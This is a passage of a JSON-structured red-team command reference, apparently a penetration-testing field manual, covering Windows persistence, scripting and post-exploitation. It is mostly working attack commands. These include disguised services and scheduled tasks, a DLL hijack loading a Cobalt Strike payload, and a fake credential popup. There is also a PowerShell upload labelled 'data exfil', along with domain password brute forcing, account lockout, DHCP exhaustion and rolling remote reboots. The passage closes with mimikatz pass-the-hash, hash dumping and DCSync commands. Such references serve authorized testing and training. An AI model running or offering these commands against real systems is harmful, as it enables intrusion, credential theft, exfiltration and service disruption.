      "content": "schtasks /run /tn OfficeUpdater",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Task Manually",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /create /tn OfficeUpdater /xml <FILE_PATH>.xml /f",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Optional: Can call schtasks to import a task as XML",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service Creation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload binary to folder and create service pointing at that binary. Can change the service description and display name to blend into the target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc create <SERVICE_NAME> binpath= \"<FILE_PATH>\" start= auto displayname= \"Windows Update Proxy Service\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Add service (Change displayname to a name that blends in with your executable)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc description <SERVICE_NAME> \"This service ensures Windows Update works correctly in proxy environments\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Assign description to service (Change description to a phrase that blends in with your service information)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc qc <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query Service config",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc query <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query service status",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc qdescription <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Query service description",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc delete <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Delete service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sc \\\\<IP_ADDRESS> qc <SERVICE_NAME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "OPTIONAL: Can execute sc.exe commands remotely by referencing the remote system after sc.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "sc.exe",
          "sc.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Windows 10 .DLL Hijack (WPTSEXTENSIONS)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Upload malicous.dll named WptsExtensions.dll (works with default Cobalt Strike .dll) anywhere in system path, reboot machine, and the schedule service will load the malicious WptsExtensions.dll",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v PATH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List folders in PATH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload malicous.dll named \"WptsExtensions.dll\" to folder in PATH",
      "level": 0,
      "metadata": {
        "file_paths": [
          "malicous.dll",
          "WptsExtensions.dll"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Reboot target computer (Schedule service will load WptsExtensions.dll on startup)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remove uploaded WptsExtensions.dll to remove persistence",
      "level": 0,
      "metadata": {
        "file_paths": [
          "WptsExtensions.dll"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Note: Many .dll hijacks exist on Windows systems and a simple Google search should list all the vulnerable filenames, services, and even contain examples of how to execute a given .dll hijack technique on a system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details various PowerShell and Batch script examples. Some of these examples enumerate system information, cause system effects, or aid with the discovery of sensitive information.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell Basics",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stop-Transcript",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Stops recording",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Content <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Displays file contents",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Help <COMMAND> -Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Shows examples of <command>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Command *<STRING_TO_SEARCH>*",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Searches for command string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Displays services (stop-service, start-service)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-WmiObject -Class win32_service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Displays services, but takes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "alternate credentials",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$psVersionTable",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display PowerShell version",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "powershell -version 2.0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.0"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run PowerShell 2.0 from 3.0",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Service | measure-object",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Returns # of services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "get-psdrive",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Displays drives in the current session",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Get-Process | select -expandproperty name",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Returns only process names",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "get-help * -parameter credential",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cmdlets that take creds",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "get-wmiobject -list *network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Available WMI network commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "[Net.DNS]::GetHostEntry(\"<IP_ADDRESS>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell OneLiners",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "powershell -ep bypass -nop -File <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Launch file with PowerShell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$ports=(<PORT>,<PORT>,<PORT>);$ip=\"<IP_ADDRESS>\";foreach ($port in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket –eq $NULL){echo $ip\":\"$port\" – Closed\";}else{echo $ip\":\"$port\" – Open\";$socket = $NULL;}}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "TCP port connection (scanner)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Change <PORT>’s to match desired ports to scan, and replace IP)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$ping = New-Object System.Net.Networkinformation.ping;$ping.Send(\"<IP_ADDRESS>\",500)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ping with 500 millisecond timeout",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "powershell –WindowStyle Hidden –ExecutionPolicy Bypass $Host.UI.PromptForCredential(\"<WINDOW_TITLE>\",\"<MESSAGE>\",\"<USERNAME>\",\"<DOMAIN>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Basic authentication popup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "powershell –Command \"do {if ((Get-Date –format YYYYMMDD-HHMM) –match ‘202208(0[8-9]|1[0-1])-(0[8-9]|1[0-7])[0-5][0-9]’){Start-Process –WindowStyle Hidden \"<FILE_PATH>\";Start-Sleep –s 14400}}while(1)\"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Run FILE every 4 hours between Aug 8-11, 2022 and the hours of 0800-1700 (from Cmd.exe)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$password = convertto-securestring –string \"<PASSWORD>\" –asplaintext –force;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "$pp = new-object –typename System.Management.Automation.PSCredential –argumentlist \"<DOMAIN>\\<USERNAME>\", $pw;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start-Process powershell –Credential $pp –ArgumentList ‘-noprofile –command &{Start-Process <FILE_PATH> -verb runas}’",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell runas",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell OneLiners Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Send-MailMessage –to \"<EMAIL>\" –from \"<EMAIL>\" –subject \"<SUBJECT>\" –a \"<FILE_ATTACHEMENT>\" –body \"<BODY>\" –SmtpServer \"<IP_ADDRESS>\" -Port \"<PORT>\" -Credential \"<PS_CRED_OBJECT>\" -UseSsl",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Email sender",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "powershell –noprofile –noninteractive –Command 'Invoke-WebRequest -Uri \"https://<URL>\" -OutFile <FILE_PATH>'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "PowerShell file download from specified URL",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Script will send a file ($filepath) via http to server ($server) via POST request. Must have web server listening on port designated in the $server",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "powershell –noprofile –noninteractive –command ‘[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server=\"\"\"http://<URL>\"\"\"; $filepath=\"\"\"<FILE_PATH> \"\"\"; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);’",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell data exfil",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv <FILE_PATH>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Export OS info into CSV file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Get-Service | where {$_.status -eq \"Running\"}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List running services",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PowerShell Netstat Equivalent",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "New-PSDrive -Persist -PSProvider FileSystem -Root \\\\<IP_ADDRESS>\\<SHARE_FOLDER> -Name i",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Persistent PSDrive to remote file share",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Get-ChildItem -Path <FILE_PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt \"2012-08-20\"}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Return files with write date past 8/20",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Powershell -Command 'Enable-PSRemoting -Force’",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Turn on PowerShell remoting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Batch Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Batch Scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "If executing script from a batch file, variables must be preceded with % (for a total of 2 %’s).",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100 10.10.%i.%x 2>nul | find \"Reply\" && echo 10.10.%i.%x >> live.txt)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nested for loop ping sweep",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /F \"tokens=*\" %%A in (<FILE_PATH>) do echo %%A",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Loop through each line in a file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /F %%N in (users.txt) do for /F %%P in (passwords.txt) do net use \\\\<IP_ADDRESS>\\IPC$ /user:<DOMAIN> \\%%N %%P 1>NUL 2>&1 && echo %%N:%%P && net use /delete \\\\<IP_ADDRESS>\\IPC$ > NUL",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domain brute forcer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "@echo Test run:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /F \"tokens=*\" %%A in (<FILE_PATH>) do net use \\\\<IP_ADDRESS>\\c$ /USER:<DOMAIN>\\%%A wrongpass",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Account lockout (lockout.bat)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /L %%P in (2,1,254) do (netsh interface ip set address name= \"<INTERFACE_NAME>\" static 10.0.42.%%P 255.255.255.0 <GATEWAY_IP> && ping 127.0.0.1 –n 1 –w 10000 > nul %1)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DHCP exhaustion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /L %%P in (2,1,254) do (nslookup 10.1.11.%%P | findstr /i /c:\"Name\" >> dns.txt && echo HOST: 10.1.11.% %%P >> dns.txt)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS reverse lookup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Batch Scripts Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "forfiles /P <FILE_PATH> /s /m pass* -c \"cmd /c echo @isdir @fdate @ftime @relpath @path @fsize\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Search for files beginning with the word \"pass\" and then print if it's a directory, file date/time, relative path, actual path and size (@variables are optional)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Domains.txt should contain known malicious domains. If you do not want to make a legitimate DNS request for a malicious domain then just provide your local IP in place of <DNS_SERVER_IP>.",
      "level": 0,
      "metadata": {
        "file_paths": [
          "Domains.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /F \"tokens=*\" %%A in (C:\\Users\\Administrator\\Desktop\\domains.txt) do nslookup %%A <DNS_SERVER_IP>",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Simulate DNS lookups for malicious domains (useful for testing detection of AV/IDS)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /L %%P in (2,1,401) do @for %%U in (<URL1> <URL2> <URL3>) do start /b iexplore %%U & ping -n 6 localhost & taskkill /F /IM iexplore.exe",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Simulated web browsing (simple traffic generation). Browse to URL’s 400 times.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for /L %%P in (2,1,254) do shutdown /r /m \\\\1.1.1.%%P /f /t 0 /c \"Reboot message\"",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Rolling reboot (replace /r with /s for a shutdown)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Post Exploitation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details various post exploitation tools and techniques such as mimikatz, PsExec, privilege escalation tactics, file system redirection, etc.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mimikatz Credential Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz.exe \"sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<FILE_PATH>\" exit",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mimikatz.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Mimikatz PTH (Runs specified binary with PTH credentials). Must be run as SYSTEM",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz.exe \"lsadump::sam\" exit",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mimikatz.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mimikatz hashdump. Must be run as SYSTEM",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz.exe sekurlsa::pth /user:<USERNAME> /domain: <DOMAIN> /ntlm: <NTLM_HASH> /aes128:<aes128_HASH> /aes256:<aes256_HASH>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mimikatz.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PTH with AES128/256 bit keys. AES128/256 bit keys can be obtained via DCSync",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wmic group where name=\"Domain Admins\" get name,sid,domain",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "reg query HKU to retrieve logged in domain user SIDs (which contain domain SID)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Result of above commands:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "S-1-5-21-520640528-869697576-4233872597-1532",
      "level": 0,
      "metadata": {
        "dates": [
          "1-5-21"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "The Domain SID Portion is:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "S-1-5-21-520640528-869697576-4233872597",
      "level": 0,
      "metadata": {
        "dates": [
          "1-5-21"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Extract domain SID from Active Directory object",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz.exe “lsadump::dcsync /domain: <DOMAIN_FQDN> /user: <USERNAME>”",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mimikatz.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote dump hash for specific user account",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Administrators, Domain Admins, or Enterprise Admins are able to remotely DCSync)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mimikatz.exe “lsadump::secrets”",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mimikatz.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Get the SysKey to decypt SECRETS entries (from registry or hives)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz",
      "level": 0,
      "metadata": {
        "urls": [
          "https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz"
        ],
        "file_paths": [
          "//book.hacktricks.xyz"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Privilege Escalation Checklist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate all File Servers in a domain and net view to find open shares. Once all shares are located, enumerate all share files/folders for sensitive data such as: administrative info, credentials, user home directories, etc. Repeat against other systems in the domain (other server roles like database, web, etc.) which may have misconfigured network shares exposing sensitive data.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate PATH and then .DLL hijack (wlbsctrl or scheduler) if applicable.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run open-source tool \"SharpUp\" to enumerate potential privilege escalation opportunities such as vulnerable paths, weak service information, and more.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enumerate startup folder, user scheduled tasks, etc. Attempt to poison global shared scripts set to run at login.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Gain access to administrative shares and attempt to poison scripts run by administrators or macro enabled files.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://github.com/GhostPack/SharpUp",
      "level": 0,
      "metadata": {
        "urls": [
          "https://github.com/GhostPack/SharpUp"
        ],
        "file_paths": [
          "//github.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Redirection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "File System Redirection - > Jump to x64 process from x86",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Execute x64 binary: C:\\Windows\\Sysnative\\upnpcont.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\Windows\\Sysnative\\upnpcont.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tasklist /v | findstr upnpcont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Use tasklist to list processes and find the PID of the process that was launched",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Inject into PID discovered in previous step",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exit original x86 process",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section details Mac OS version information and general file system layout. There are many similarities between Mac OS and Linux, but there are also many key differences listed below.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
